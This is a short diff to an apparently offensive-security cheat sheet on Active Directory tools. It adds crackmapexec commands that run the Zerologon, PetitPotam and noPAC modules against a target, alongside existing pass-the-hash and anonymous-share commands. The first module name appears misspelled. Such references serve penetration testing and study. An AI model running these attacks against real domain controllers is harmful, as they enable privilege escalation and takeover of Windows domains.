@@ -298,6 +298,13 @@ sudo crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
 
 # anonymous access
 sudo crackmapexec smb <target ip> -u 'anonymous' -p '' --shares   
+
+# Zerologon
+crackmapexec smb <target ip> -u <username> -p <password> -M zerologo
+# PetitPotam
+crackmapexec smb <target ip> -u <username> -p <password> -M petitpotam
+# noPAC
+crackmapexec smb <target ip> -u <username> -p <password> -M nopac
 ```
 
 ### :open_file_folder: [dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))
